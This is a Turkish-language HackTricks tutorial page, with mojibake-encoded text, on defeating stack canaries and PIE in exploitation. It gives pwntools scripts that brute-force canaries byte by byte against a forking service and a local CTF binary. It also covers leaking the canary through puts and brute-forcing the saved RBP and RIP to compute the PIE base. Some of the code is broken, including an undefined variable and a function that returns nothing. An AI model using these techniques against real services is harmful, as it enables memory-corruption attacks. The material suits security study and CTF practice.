<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman seviyesine kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


**Bir canary ve PIE (Position Independent Executable) tarafÄ±ndan korunan bir ikiliyle karÅŸÄ± karÅŸÄ±yaysanÄ±z, bunlarÄ± atlatmanÄ±n bir yolunu bulmanÄ±z gerekebilir.**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`**'in, ikili bir canary tarafÄ±ndan korunduÄŸunu bulamamasÄ± durumunda, bunun statik olarak derlenmiÅŸ olduÄŸunu ve iÅŸlevi tanÄ±mlayamadÄ±ÄŸÄ± anlamÄ±na gelebilir.\
Ancak, bir deÄŸerin bir iÅŸlev Ã§aÄŸrÄ±sÄ±nÄ±n baÅŸÄ±nda yÄ±ÄŸÄ±nda kaydedildiÄŸini ve bu deÄŸerin Ã§Ä±kÄ±ÅŸ yapmadan Ã¶nce kontrol edildiÄŸini fark ederseniz, bunu manuel olarak fark edebilirsiniz.
{% endhint %}

# Brute force Canary

Basit bir canary'yi atlatmanÄ±n en iyi yolu, ikilinin **her yeni baÄŸlantÄ± kurduÄŸunuzda (aÄŸ servisi) Ã§ocuk sÃ¼reÃ§ler oluÅŸturan bir program** olmasÄ±dÄ±r, Ã§Ã¼nkÃ¼ her baÄŸlandÄ±ÄŸÄ±nÄ±zda **aynÄ± canary kullanÄ±lacaktÄ±r**.

Bu durumda, canary'yi atlatmanÄ±n en iyi yolu, sadece **her karakteri brute-force** etmek ve tahmin edilen canary baytÄ±nÄ±n doÄŸru olup olmadÄ±ÄŸÄ±nÄ± anlamak iÃ§in programÄ±n Ã§Ã¶ktÃ¼ÄŸÃ¼nÃ¼ veya dÃ¼zenli akÄ±ÅŸÄ±na devam ettiÄŸini kontrol etmektir. Bu Ã¶rnekte, **8 baytlÄ±k bir canary'yi (x64)** brute-force eden ve doÄŸru tahmin edilen bir bayt ile yanlÄ±ÅŸ bir baytÄ± sadece sunucu tarafÄ±ndan bir **yanÄ±t** gÃ¶nderilip gÃ¶nderilmediÄŸini kontrol ederek ayÄ±ran bir iÅŸlev bulunmaktadÄ±r (diÄŸer durumlarda bir **try/except** kullanmak da mÃ¼mkÃ¼ndÃ¼r):

## Ã–rnek 1

Bu Ã¶rnek 64 bit iÃ§in uygulanmÄ±ÅŸtÄ±r, ancak 32 bit iÃ§in kolayca uygulanabilir.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## Ã–rnek 2

Bu 32 bit iÃ§in uygulanmÄ±ÅŸtÄ±r, ancak kolayca 64 bit iÃ§in deÄŸiÅŸtirilebilir.\
AyrÄ±ca bu Ã¶rnekte **programÄ±n Ã¶nce giriÅŸin boyutunu belirten bir baytÄ± beklediÄŸini** ve ardÄ±ndan yÃ¼kÃ¼ dikkate alÄ±n.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# Canary YazdÄ±rma

Canary'yi atlatmanÄ±n baÅŸka bir yolu onu **yazdÄ±rmaktÄ±r**.\
Stack taÅŸmasÄ±na karÅŸÄ± savunmasÄ±z bir programÄ±n, **stack taÅŸmasÄ±nÄ±n bir kÄ±smÄ±na iÅŸaret eden** bir **puts** iÅŸlevini Ã§alÄ±ÅŸtÄ±rabileceÄŸi bir durumu hayal edin. SaldÄ±rgan, canary'nin **ilk baytÄ±nÄ±n bir null bayt** (`\x00`) olduÄŸunu ve canary'nin geri kalanÄ±nÄ±n **rastgele** baytlar olduÄŸunu bilmektedir. ArdÄ±ndan, saldÄ±rgan, stack'i **canary'nin ilk baytÄ±na kadar Ã¼zerine yazan bir taÅŸmayÄ± oluÅŸturabilir**.\
Daha sonra, saldÄ±rgan, yÃ¼kÃ¼n ortasÄ±nda **puts iÅŸlevini Ã§aÄŸÄ±rÄ±r** ve bu, canary'nin **tamamÄ±nÄ± yazdÄ±rÄ±r** (ilk null bayt hariÃ§).\
Bu bilgiyle saldÄ±rgan, canary'yi bilerek (aynÄ± program oturumu iÃ§inde) yeni bir saldÄ±rÄ± oluÅŸturabilir ve gÃ¶nderebilir.

AÃ§Ä±kÃ§asÄ±, bu taktik Ã§ok **sÄ±nÄ±rlÄ±dÄ±r**, Ã§Ã¼nkÃ¼ saldÄ±rganÄ±n **yÃ¼kÃ¼nÃ¼n iÃ§eriÄŸini yazdÄ±rabilmesi**, canary'yi **dÄ±ÅŸarÄ± Ã§Ä±karabilmesi** ve ardÄ±ndan yeni bir yÃ¼k (aynÄ± program oturumu iÃ§inde) oluÅŸturabilmesi ve **gerÃ§ek tampon taÅŸmasÄ±nÄ± gÃ¶nderebilmesi** gerekmektedir.\
CTF Ã¶rneÄŸi: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIE'yi atlatmak iÃ§in bazÄ± adresleri **sÄ±zdÄ±rmanÄ±z** gerekmektedir. Ve eÄŸer ikili bir adres sÄ±zdÄ±rmÄ±yorsa, en iyi seÃ§enek **RBP ve RIP'yi stack'te kaydedilen yerlerde brute-force etmektir**.\
Ã–rneÄŸin, bir ikili hem bir **canary** hem de **PIE** kullanarak korunuyorsa, canary'yi brute-force etmeye baÅŸlayabilir, ardÄ±ndan **sonraki** 8 bayt (x64) kaydedilen **RBP** ve **sonraki** 8 bayt kaydedilen **RIP** olacaktÄ±r.

Ä°kili dosyadan RBP ve RIP'yi brute-force etmek iÃ§in, doÄŸru tahmin edilen bir baytÄ±n programÄ±n bir ÅŸey Ã§Ä±ktÄ±ladÄ±ÄŸÄ±nÄ± veya Ã§Ã¶kmediÄŸini anlayabilirsiniz. Canary'yi brute-force etmek iÃ§in saÄŸlanan **aynÄ± iÅŸlev**, RBP ve RIP'yi brute-force etmek iÃ§in de kullanÄ±labilir:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## Temel adresi al

PIE'yi yenmek iÃ§in ihtiyacÄ±nÄ±z olan son ÅŸey, sÄ±zdÄ±rÄ±lan adreslerden yararlÄ± adresleri hesaplamaktÄ±r: **RBP** ve **RIP**.

**RBP**'den, **shellinizi yÄ±ÄŸÄ±nda nereye yazdÄ±ÄŸÄ±nÄ±zÄ± hesaplayabilirsiniz**. Bu, _"/bin/sh\x00"_ dizesini yÄ±ÄŸÄ±nÄ±n iÃ§ine nereye yazacaÄŸÄ±nÄ±zÄ± bilmek iÃ§in Ã§ok faydalÄ± olabilir. SÄ±zdÄ±rÄ±lan RBP ve shellcode arasÄ±ndaki mesafeyi hesaplamak iÃ§in, sÄ±zdÄ±rdÄ±ktan sonra bir **kesme noktasÄ± koyabilir ve shellcode'un nerede bulunduÄŸunu kontrol edebilirsiniz**, ardÄ±ndan shellcode ile RBP arasÄ±ndaki mesafeyi hesaplayabilirsiniz:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** Ã¼zerinden, **PIE ikili dosyasÄ±nÄ±n temel adresini** hesaplayabilirsiniz, bu da geÃ§erli bir **ROP zinciri** oluÅŸturmak iÃ§in ihtiyacÄ±nÄ±z olan ÅŸeydir.\
Temel adresi hesaplamak iÃ§in sadece `objdump -d vunbinary` komutunu kullanÄ±n ve aÅŸaÄŸÄ±daki gibi en son adresleri inceleyin:

![](<../../.gitbook/assets/image (145).png>)

Bu Ã¶rnekte, tÃ¼m kodu bulmak iÃ§in sadece **1 Byte ve yarÄ±m** gerektiÄŸini gÃ¶rebilirsiniz, bu durumda temel adres, sÄ±zdÄ±rÄ±lan RIP'in sonunda "000" ile biten olacaktÄ±r. Ã–rneÄŸin, eÄŸer _0x562002970**ecf**_ sÄ±zdÄ±rdÄ±ysanÄ±z, temel adres _0x562002970**000**_ olacaktÄ±r.
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
